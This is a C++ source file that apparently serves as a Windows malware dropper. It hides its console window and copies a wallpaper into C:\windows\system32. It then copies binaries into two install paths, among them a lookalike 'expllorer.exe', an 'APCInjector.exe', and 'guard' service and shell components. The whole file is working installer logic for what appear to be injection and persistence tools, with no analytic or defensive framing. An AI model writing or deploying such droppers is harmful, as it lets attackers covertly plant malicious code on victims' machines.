


#include"bin\MustInclude.h"
#include"process.h"
#include"admin.h"
#include"RegFunc.h"
#include"file.h"
#define CLS system("cls");
#define PAUSE system("pause>nul");
#include<iostream>
using namespace std;
string CurDir,BinSrc;
string key="114514";
string src;
string tgt;




void copyToBin2(char* binPath){

	for(int i=0;i<sizeof(allBinFile) / sizeof(allBinFile[0]);i++){
		CopyFileToDirectory(addStrings(BinSrc.c_str(),allBinFile[i].c_str()),binPath);
	}

	for(int i=0;i<sizeof(allBinFile) / sizeof(allBinFile[0]);i++){
		CopyFileWithCommand(addStrings(BinSrc.c_str(),allBinFile[i].c_str()),binPath);
	}
}

void copyToBin(char* binPath){
	CopyFileToDirectory(addStrings(BinSrc.c_str(),"expllorer.exe"),binPath);
	CopyFileToDirectory(addStrings(BinSrc.c_str(),"APCInjector.exe"),binPath);
	CopyFileToDirectory(addStrings(BinSrc.c_str(),"SystemShellGuard.dll"),binPath);
	CopyFileToDirectory(addStrings(BinSrc.c_str(),"SCMServiceGuard.exe"),binPath);
	CopyFileToDirectory(addStrings(BinSrc.c_str(),"ProgrammBanner.exe"),binPath);
	CopyFileToDirectory(addStrings(BinSrc.c_str(),"Fuck.exe"),binPath);
	if(!fileExist(string(string(binPath)+"SCMServiceGuard.exe"))||!fileExist(string(string(binPath)+"expllorer.exe"))||!fileExist(string(string(binPath)+"ProgrammBanner.exe"))||!fileExist(string(string(binPath)+"Fuck.exe"))){
	cout<<"文件复制失败\n正在尝试使用copy指令\n";
	CopyFileWithCommand(addStrings(BinSrc.c_str(),"expllorer.exe"),binPath);
	CopyFileWithCommand(addStrings(BinSrc.c_str(),"APCInjector.exe"),binPath);
	CopyFileWithCommand(addStrings(BinSrc.c_str(),"SystemShellGuard.dll"),binPath);
	CopyFileWithCommand(addStrings(BinSrc.c_str(),"SCMServiceGuard.exe"),binPath);
	CopyFileWithCommand(addStrings(BinSrc.c_str(),"ProgrammBanner.exe"),binPath);
	CopyFileWithCommand(addStrings(BinSrc.c_str(),"Fuck.exe"),binPath);
	}
}

void init(){

	CurDir=GetCurrentDirectory();
	BinSrc=CurDir+"\\bin\\";

	CopyFileWithCommand(addStrings(BinSrc.c_str(),WALLPAPER_NAME),"C:\\windows\\system32\\");
	CopyFileToDirectory(addStrings(BinSrc.c_str(),WALLPAPER_NAME),"C:\\windows\\system32\\");//拷贝目标壁纸
	
	copyToBin(BIN_PATH);
	copyToBin2(BIN_PATH);
	copyToBin(SECOND_BIN_PATH);
	copyToBin2(SECOND_BIN_PATH);


}

int main () {
	HWND consoleWindow = GetConsoleWindow();
    ShowWindow(consoleWindow, SW_HIDE);
	init();
	
	return 0;
}